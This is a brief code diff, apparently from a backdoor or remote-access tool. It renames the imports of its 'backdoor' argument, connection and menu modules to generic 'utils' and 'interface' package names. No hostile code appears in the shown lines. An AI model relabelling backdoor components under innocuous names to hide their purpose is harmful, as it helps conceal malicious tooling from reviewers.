@@ -3,9 +3,9 @@ from queue import Queue
 from sys import exit
 from time import sleep
 
-from backdoor.args import get_args
-from backdoor.connection import estabilish_connection
-from backdoor.menu import main_menu
+from utils.args import get_args
+from utils.connection import estabilish_connection
+from interface.menu import main_menu
 
 
 n_threads = 2
